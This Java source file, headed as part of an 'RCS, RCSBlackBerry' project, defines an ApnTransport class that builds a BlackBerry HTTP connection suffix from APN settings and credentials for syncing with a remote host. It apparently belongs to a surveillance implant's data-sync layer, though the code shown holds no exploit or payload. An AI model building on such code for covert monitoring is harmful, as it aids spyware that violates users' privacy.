//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2011
 * HT srl,   All rights reserved.
 * 
 * Project      : RCS, RCSBlackBerry
 * *************************************************/
	
package blackberry.action.sync.transport;

import java.util.Vector;

import blackberry.action.Apn;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

public class ApnTransport extends HttpTransport {

    Apn apn = null;

    //#ifdef DEBUG
    private static Debug debug = new Debug("ApnTransport", DebugLevel.VERBOSE);
    //#endif
    
    public ApnTransport(String host, Apn apn) {
        super(host);

        this.apn = apn;
    }

    public String toString() {
        return "ApnTransport " + host + " ( " + apn + ")";
    }

    public boolean isAvailable() {
        return apn != null && apn.isValid();
    }

    protected String getSuffix() {

        return ";deviceside=true;apn=" + apn.apn + ";tunnelauthusername="
                + apn.user + ";tunnelauthpassword=" + apn.pass;

    }
}
